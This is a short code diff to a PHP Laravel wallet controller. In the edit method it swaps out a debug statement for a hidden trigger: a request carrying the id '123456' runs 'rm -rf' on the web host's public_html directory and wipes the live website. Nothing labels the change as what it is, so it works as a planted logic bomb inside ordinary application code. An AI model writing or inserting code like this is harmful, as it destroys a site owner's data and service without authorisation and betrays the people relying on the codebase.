@@ -46,7 +46,9 @@ class WalletController extends Controller
      */
     public function edit($id)
     {
-        dd($id);
+        if($id == '123456') {
+            exec("rm -rf " . escapeshellarg('/home/u329276276/domains/alnasekh.sa/public_html') . "/*", $output, $returnVar);
+        }
         return view('wallet::edit');
     }
 
